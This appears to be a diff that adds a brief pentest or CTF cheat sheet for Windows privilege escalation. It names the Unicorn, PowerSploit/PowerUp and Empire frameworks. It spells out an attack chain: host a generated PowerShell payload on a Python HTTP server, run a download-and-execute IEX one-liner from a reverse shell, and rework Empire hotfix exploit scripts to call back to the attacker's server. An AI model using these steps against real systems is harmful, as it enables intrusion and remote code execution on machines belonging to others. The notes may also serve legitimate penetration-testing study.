@@ -1,0 +1,23 @@
+Privilege escalation via unicorn:
+
+-place generated Unicorn powershell script in html file
+-in same directory run:
+"python -m SimpleHTTPServer" # starts http server in current directory
+-in reverse shell run:
+"powershell "IEX(New-Object Net.WebClient).downloadString('<target html file>')" # runs powershell code from webpage
+
+
+PowerSploit post-exploitation framework:
+- clone https://github.com/PowerShellMafia/PowerSploit
+
+    Powerup:
+    -run powerup script from the privesc folder to find service misconfigurations
+
+Empire post-exploitation framework:
+- clone https://github.com/EmpireProject/Empire
+
+    Windows hotfix exploits:
+    - add filled in example to bottom of exploit script from data/module_sources/privesc directory
+    - replace URL with python server URL to reverse shell
+    - serve up on python server and execute on target box using request
+
